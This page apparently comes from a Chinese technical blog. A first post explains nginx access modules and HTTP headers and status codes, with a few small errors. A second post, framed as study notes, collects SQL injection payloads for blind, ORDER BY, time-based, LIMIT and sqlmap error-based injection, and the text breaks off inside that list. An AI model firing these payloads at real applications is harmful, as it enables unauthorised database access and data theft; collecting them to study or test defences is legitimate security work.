<h4 id="2-4-4-access-模块"><a href="#2-4-4-access-模块" class="headerlink" title="2.4.4 access 模块"></a>2.4.4 access 模块</h4><h5 id="2-4-4-1-allow-和-deny"><a href="#2-4-4-1-allow-和-deny" class="headerlink" title="2.4.4.1  allow 和 deny"></a>2.4.4.1  allow 和 deny</h5><p>可以通过 allow 和 deny 做简单的ip 来源限制</p>
<h5 id="2-4-4-2-auth-basic-基本的验证"><a href="#2-4-4-2-auth-basic-基本的验证" class="headerlink" title="2.4.4.2 auth_basic 基本的验证"></a>2.4.4.2 auth_basic 基本的验证</h5><p>通过一个密码文件，验证用户的登录名和密码</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569490131866.png" alt="1569490131866"></p>
<h5 id="2-4-4-3-auth-request"><a href="#2-4-4-3-auth-request" class="headerlink" title="2.4.4.3 auth_request"></a>2.4.4.3 auth_request</h5><p>交给上游服务器，可以由一定的业务来判断</p>
<p>原理： 收到请求后，通过反向代理技术把请求传递给上游服务</p>
<h5 id="2-4-4-4-staisfy-指令"><a href="#2-4-4-4-staisfy-指令" class="headerlink" title="2.4.4.4 staisfy 指令"></a>2.4.4.4 staisfy 指令</h5><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569490285731.png" alt="1569490285731"></p>
<p>所有并不是 access 模块，所有的指令都会执行，根据satisfy 设置的不同，走不同的流程。<br>可能经过一个阶段就跳入到下一个流程模块去。</p>
<h4 id="2-4-5-try-files"><a href="#2-4-5-try-files" class="headerlink" title="2.4.5 try_files"></a>2.4.5 try_files</h4><p>原理 ： 依次试图访问多个URL对应的文件，当文件存在时直接返回文件内容。<br>按照顺序访问，<br>如果所有的文件都不存在，则按照最后一个URL结果或者code返回。</p>
<h4 id="2-4-6-mirror"><a href="#2-4-6-mirror" class="headerlink" title="2.4.6 mirror"></a>2.4.6 mirror</h4><p>处理请求时，生产<strong>子请求</strong>访问其他服务，对子请求的返回值不做处理</p>
<p>可以做流量的备份。</p>
<h4 id="2-4-7-autoindex-模块"><a href="#2-4-7-autoindex-模块" class="headerlink" title="2.4.7 autoindex 模块"></a>2.4.7 autoindex 模块</h4><p>当 URL 以 / 结尾时，尝试以 html/xml/json/jsonp 等格式返回 root/alias 中指定目录的目录结构</p>
<h3 id="2-5-对应命令参数"><a href="#2-5-对应命令参数" class="headerlink" title="2.5 对应命令参数"></a>2.5 对应命令参数</h3><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/56003909-5d6227ef092c2.png" alt="56003909-5d6227ef092c2"></p>
<h2 id="3-http各字段含义及响应码含义"><a href="#3-http各字段含义及响应码含义" class="headerlink" title="3. http各字段含义及响应码含义"></a>3. http各字段含义及响应码含义</h2><h4 id="3-1-HTTP简单理解"><a href="#3-1-HTTP简单理解" class="headerlink" title="3.1 HTTP简单理解"></a>3.1 HTTP简单理解</h4><table>
<thead>
<tr>
<th>协议类型</th>
<th>区别</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP1.0</td>
<td>1.0规定浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求。（多个TCP连接，多请求，使用后关闭）</td>
</tr>
<tr>
<td>HTTP2.0</td>
<td>1.1则支持持久连接Persistent Connection, 并且默认使用persistent  connection. 在同一个tcp的连接中可以传送多个HTTP请求和响应. 多个请求和响应可以重叠，多个请求和响应可以同时进行. 更加多的请求头和响应头(比如HTTP1.0没有host的字段).（单个TCP隧道，默认长连接，多请求。需有“Connection: close字段”，才会进行连接的关闭）通过cookie进行身份认证。</td>
</tr>
</tbody></table>
<p>在1.0时的会话方式：</p>
<ol>
<li><p>建立连接</p>
</li>
<li><p>发出请求信息</p>
</li>
<li><p>回送响应信息</p>
</li>
<li><p>关掉连接</p>
<p><strong>HTTP 1.1的持续连接，也需要增加新的请求头来帮助实现，例如，Connection请求头的值为Keep-Alive时，客户端通知服务器返回本次请求结果后保持连接；Connection请求头的值为close时，客户端通知服务器返回本次请求结果后关闭连接。**</strong>HTTP 1.1还提供了与身份认证、状态管理和Cache缓存等机制相关的请求头和响应头。</p>
</li>
</ol>
<p>请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟。例如：一个包含有许多图像的网页文件的多个请求和应答可以在一个连接中传输，但每个单独的网页文件的请求和应答仍然需要使用各自的连接。  HTTP 1.1还允许客户端不用等待上一次请求结果返回，就可以发出下一次请求，但服务器端必须按照接收到客户端请求的先后顺序依次回送响应结果，以保证客户端能够区分出每次请求的响应内容。</p>
<p><strong>2.HTTP 1.1增加host字段</strong></p>
<p>在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。</p>
<p> HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。此外，服务器应该接受以绝对路径标记的资源请求。</p>
<p><strong>3.100(Continue) Status(节约带宽)</strong></p>
<p>HTTP/1.1加入了一个新的状态码100（Continue）。客户端事先发送一个只带头域的请求，如果服务器因为权限拒绝了请求，就回送响应码401（Unauthorized）；如果服务器接收此请求就回送响应码100，客户端就可以继续发送带实体的完整请求了。100 (Continue) 状态代码的使用，允许客户端在发request消息body之前先用request header试探一下server，看server要不要接收request body，再决定要不要发request body。</p>
<p><strong>4</strong>.HTTP/1.1中引入了Chunked transfer-coding来解决上面这个问题，发送方将消息分割成若干个任意大小的数据块，每个数据块在发送时都会附上块的长度，最后用一个零长度的块作为消息结束的标志。这种方法允许发送方只缓冲消息的一个片段，避免缓冲整个消息带来的过载。</p>
<p><strong>5</strong>.HTTP/1.1在1.0的基础上加入了一些cache的新特性，当缓存对象的Age超过Expire时变为stale对象，cache不需要直接抛弃stale对象，而是与源服务器进行重新激活（revalidation）</p>
<h4 id="3-2-HTTP协议对资源的操作"><a href="#3-2-HTTP协议对资源的操作" class="headerlink" title="3.2 HTTP协议对资源的操作"></a>3.2 HTTP协议对资源的操作</h4><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>请求获取URL位置的资源</td>
</tr>
<tr>
<td>HEAD</td>
<td>请求获取URL位置资源的响应消息报告，即获得该资源的头部信息</td>
</tr>
<tr>
<td>POST</td>
<td>请求向URL位置的资源后附加新的数据</td>
</tr>
<tr>
<td>PUT</td>
<td>请求向URL位置存储一个资源，覆盖原URL位置资源</td>
</tr>
<tr>
<td>PATCH</td>
<td>请求局部更新URL位置的资源，即改变该处资源的部分内容</td>
</tr>
<tr>
<td>DELETE</td>
<td>请求删除URL位置存储的资源</td>
</tr>
</tbody></table>
<h4 id="3-3-理解PATCH和PUT区别"><a href="#3-3-理解PATCH和PUT区别" class="headerlink" title="3.3 理解PATCH和PUT区别"></a>3.3 理解PATCH和PUT区别</h4><p>　假设URL位置有一组数据UserInfo，包括UserID、UserName等20个字段。<br>　需求：用户修改了UserName，其他不变。<br>　　　　· 采用PATCH，仅向URL提交UserName的局部更新请求。<br>　　　　· 采用PUT，必须将所有20个字段一并提交到URL，未提交字段被删除。</p>
<p>　PATCH的主要好处：节省网络带宽</p>
<h4 id="3-4-request请求Header简介"><a href="#3-4-request请求Header简介" class="headerlink" title="3.4 request请求Header简介"></a>3.4 request请求Header简介</h4><table>
<thead>
<tr>
<th>类型</th>
<th>表示含义</th>
</tr>
</thead>
<tbody><tr>
<td>Accept:</td>
<td>客户机支持类型</td>
</tr>
<tr>
<td>Accept-Charset:</td>
<td>采用的编码类型</td>
</tr>
<tr>
<td>Accept-Encoding:</td>
<td>客户机支持的数据压缩格式</td>
</tr>
<tr>
<td>Accept-Language:</td>
<td>客户机语言环境</td>
</tr>
<tr>
<td>Host:</td>
<td>想访问的主机名</td>
</tr>
<tr>
<td>If-Modified-Since:</td>
<td>资源缓存到客户机的时间</td>
</tr>
<tr>
<td>Referer:</td>
<td>跳转来源（跳到此网页所点击的链接，主要用于防盗链）</td>
</tr>
<tr>
<td>User-Agent:</td>
<td>客户机的软件环境（操作系统版本，浏览器版本）</td>
</tr>
<tr>
<td>Cookie:</td>
<td>从客户机传数据</td>
</tr>
<tr>
<td>Connection:</td>
<td>请求完之后是否关闭连接</td>
</tr>
<tr>
<td>Date:</td>
<td>请求时间</td>
</tr>
<tr>
<td>Range:</td>
<td>说明请求服务器资源的一部分 bytes=1000 ，表示1000字符之后的数据</td>
</tr>
</tbody></table>
<h4 id="3-5-response响应Header"><a href="#3-5-response响应Header" class="headerlink" title="3.5 response响应Header"></a>3.5 response响应Header</h4><p>状态行：处理结果，返回状态码</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>表示含义</th>
</tr>
</thead>
<tbody><tr>
<td>100~199</td>
<td>表示请求成功，要求客户机继续提交下一次请求才能完成整个处理过程</td>
</tr>
<tr>
<td>200~299</td>
<td>表示请求成功并完成整个处理过程，常用200</td>
</tr>
<tr>
<td>300~399</td>
<td>表示完成请求，客户机需要进一步细化请求，例如请求的资源已经移动到一个新地址，常用302（请求其他资源，结合location使用）、304（读取缓存）、307（读取缓存）</td>
</tr>
<tr>
<td>400~499</td>
<td>客户端的请求有错误，常见404（不存在）、403（无权限）</td>
</tr>
<tr>
<td>500~599</td>
<td>服务器端出现错误，常见500</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>服务器类型</th>
<th>表示含义</th>
</tr>
</thead>
<tbody><tr>
<td>Content-Encoding:</td>
<td>服务器回送数据的压缩格式</td>
</tr>
<tr>
<td>Content-Type:</td>
<td>服务器回送的数据类型</td>
</tr>
<tr>
<td>Content-Lengtg:</td>
<td>服务器回送数据的长度</td>
</tr>
<tr>
<td>Last-Modified:</td>
<td>当前资源的最后缓存时间</td>
</tr>
<tr>
<td>Refresh:</td>
<td>告诉浏览器多长时间刷新一次</td>
</tr>
<tr>
<td>Content-Disposition:</td>
<td>告诉浏览器以下载方式打开数据（例如：attachment;filename=3.ico）</td>
</tr>
<tr>
<td>Transfer-Encoding:</td>
<td>告诉浏览器数据的传送格式</td>
</tr>
<tr>
<td>Set-Cookie:</td>
<td>setcookie() 函数向客户端发送一个 HTTP cookie。</td>
</tr>
<tr>
<td>ETag:</td>
<td>缓存相关的</td>
</tr>
<tr>
<td>Expires:</td>
<td>告诉浏览器吧回送的资源缓存多长时间（0，-1表示不缓存）</td>
</tr>
<tr>
<td>Catch-Control:no-catche</td>
<td>告诉浏览器不要缓存数据</td>
</tr>
<tr>
<td>Pragma:no-catche</td>
<td>告诉浏览器不要缓存数据</td>
</tr>
<tr>
<td>Cookie:</td>
<td>cookies是由网络服务器存储在你电脑硬盘上的一个txt类型的小文件，它和你的网络浏览行为有关，所以存储在你电脑上的cookies就好像你的一张身份证，你电脑上的cookies和其他电脑上的cookies是不一样的。</td>
</tr>
</tbody></table>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://blog.csdn.net/sand_ant/article/details/10503579" target="_blank" rel="noopener">https://blog.csdn.net/sand_ant/article/details/10503579</a></p>
<p><a href="https://segmentfault.com/a/1190000020178836" target="_blank" rel="noopener">https://segmentfault.com/a/1190000020178836</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/21/数据库相关注入语句的收集和学习-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/21/数据库相关注入语句的收集和学习-6/" itemprop="url">第六周-数据库相关注入语句的收集和学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-21T16:55:34+08:00">
                2019-09-21
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/09/21/数据库相关注入语句的收集和学习-6/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/09/21/数据库相关注入语句的收集和学习-6/" class="cy_cmt_count" data-xid="2019/09/21/数据库相关注入语句的收集和学习-6/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/09/21/数据库相关注入语句的收集和学习-6/" class="leancloud_visitors" data-flag-title="第六周-数据库相关注入语句的收集和学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h1 id="第六周-数据库相关注入语句的收集和学习"><a href="#第六周-数据库相关注入语句的收集和学习" class="headerlink" title="第六周-数据库相关注入语句的收集和学习"></a>第六周-数据库相关注入语句的收集和学习</h1><h3 id="一、网上收集的Sql注入payload"><a href="#一、网上收集的Sql注入payload" class="headerlink" title="一、网上收集的Sql注入payload."></a>一、网上收集的Sql注入payload.</h3><h4 id="1-1-盲注payload"><a href="#1-1-盲注payload" class="headerlink" title="1.1 盲注payload"></a>1.1 盲注payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">\</span><br><span class="line">'</span><br><span class="line">"</span><br><span class="line">%df'</span><br><span class="line">%df"</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">' and '1'='1</span><br><span class="line">' and '1'='2</span><br><span class="line">" and "1"="1</span><br><span class="line">" and "1"="2</span><br><span class="line">) and (1=1</span><br><span class="line">) and (1=2</span><br><span class="line">') and ('1'='1</span><br><span class="line">') and ('1'='2</span><br><span class="line">%' and 1=1 and '%'='</span><br><span class="line">%' and 1=2 and '%'='x</span><br><span class="line">%') and 1=1 and ('%'='</span><br><span class="line">%') and 1=2 and ('%'='x</span><br><span class="line">OR 1=1</span><br><span class="line">OR 1=2</span><br><span class="line">' OR 1=1<span class="comment">-- -</span></span><br><span class="line">' OR 1=2<span class="comment">-- -</span></span><br><span class="line">) OR 1=1<span class="comment">-- -</span></span><br><span class="line">) OR 1=2<span class="comment">-- -</span></span><br><span class="line">') OR 1=1<span class="comment">-- -</span></span><br><span class="line">') OR 1=2<span class="comment">-- -</span></span><br><span class="line">" OR "1"="1</span><br><span class="line">" OR "1"="2</span><br><span class="line">' OR '1'='1</span><br><span class="line">' OR '1'='2</span><br><span class="line">) OR (1=1</span><br><span class="line">) OR (1=2</span><br><span class="line">') OR ('1'='1</span><br><span class="line">') OR ('1'='2</span><br></pre></td></tr></table></figure>

<h4 id="1-2-ORDER-BY-注入payload"><a href="#1-2-ORDER-BY-注入payload" class="headerlink" title="1.2 ORDER BY 注入payload"></a>1.2 <strong>ORDER BY</strong> 注入payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(case when(1=1) then 1 else (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">,(<span class="number">1</span>-(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,(<span class="number">1</span>-(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,<span class="number">1</span>=<span class="keyword">if</span>((<span class="number">1</span>=<span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,<span class="number">1</span>=<span class="keyword">if</span>((<span class="number">1</span>=<span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,<span class="keyword">If</span>((<span class="number">1</span>=<span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,<span class="keyword">If</span>((<span class="number">1</span>=<span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,<span class="keyword">If</span>((<span class="number">1</span>=<span class="number">1</span>),<span class="keyword">sleep</span>(<span class="number">4</span>),(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">-<span class="keyword">IF</span>((<span class="number">1</span>=<span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">-<span class="keyword">IF</span>((<span class="number">1</span>=<span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">-(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">-(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>

<h4 id="1-3-时间注入payload"><a href="#1-3-时间注入payload" class="headerlink" title="1.3 时间注入payload"></a>1.3 时间注入payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">'%2b(if((1=1 and sleep(4)),1,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>)))%<span class="number">2</span>b<span class="string">'a</span></span><br><span class="line"><span class="string">-IF((1=1),sleep(4),(SELECT 1 UNION SELECT 2))-- -</span></span><br><span class="line"><span class="string">'</span>;(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))lWuP)<span class="comment">-- -</span></span><br><span class="line">;<span class="keyword">SELECT</span> <span class="keyword">sleep</span>(<span class="number">4</span>)</span><br><span class="line">);<span class="keyword">SELECT</span> <span class="keyword">sleep</span>(<span class="number">4</span>)<span class="comment">-- -</span></span><br><span class="line">;<span class="keyword">SELECT</span> <span class="keyword">sleep</span>(<span class="number">4</span>)<span class="comment">-- -</span></span><br><span class="line">;(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))lWuP)<span class="comment">-- -</span></span><br><span class="line"><span class="string">' AND SLEEP(4)%23</span></span><br><span class="line"><span class="string">AND sleep(4)</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">AND</span> <span class="keyword">sleep</span>(<span class="number">4</span>) <span class="keyword">AND</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">'</span>) <span class="keyword">AND</span> <span class="keyword">sleep</span>(<span class="number">4</span>) <span class="keyword">AND</span> (<span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">) AND sleep(4) AND (1=1</span></span><br><span class="line"><span class="string">" AND sleep(4) AND "1"="</span></span><br><span class="line"><span class="string">'</span>) <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x)<span class="comment">-- -</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x)</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="string">' and (select(0)from(select(sleep(4)))x) and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line"><span class="string">" and (select(0)from(select(sleep(4)))x) and "</span><span class="number">1</span><span class="string">"="</span><span class="number">1</span></span><br><span class="line">) <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="string">') and (select(0)from(select(sleep(4)))x) and ('</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line"><span class="keyword">rlike</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="string">' rlike (select(0)from(select(sleep(4)))x) and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line">) <span class="keyword">rlike</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="string">') rlike (select(0)from(select(sleep(4)))x) and ('</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line">;waitfor delay '0:0:4' <span class="comment">-- -</span></span><br><span class="line">';waitfor delay '0:0:4' <span class="comment">-- -</span></span><br><span class="line">);waitfor delay '0:0:4' <span class="comment">-- -</span></span><br><span class="line">');waitfor delay '0:0:4' <span class="comment">-- -</span></span><br><span class="line">if(now()=sysdate(),sleep(4),0)<span class="comment">/*'XOR(if(now()=sysdate(),sleep(4),0))OR'"XOR(if(now()=sysdate(),sleep(4),0))OR"*/</span></span><br><span class="line">(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))lWuP)</span><br></pre></td></tr></table></figure>

<h4 id="1-4-LIMIT-注入payload"><a href="#1-4-LIMIT-注入payload" class="headerlink" title="1.4 LIMIT 注入payload"></a>1.4 <strong>LIMIT</strong> 注入payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procedure analyse(extractvalue(1,if(1=1,benchmark(5000000,md5(1)),2)),1)</span><br></pre></td></tr></table></figure>

<h3 id="二、Sqlmap中注入payload"><a href="#二、Sqlmap中注入payload" class="headerlink" title="二、Sqlmap中注入payload"></a>二、Sqlmap中注入payload</h3><h4 id="2-1-错误注入payload"><a href="#2-1-错误注入payload" class="headerlink" title="2.1 错误注入payload"></a>2.1 错误注入payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 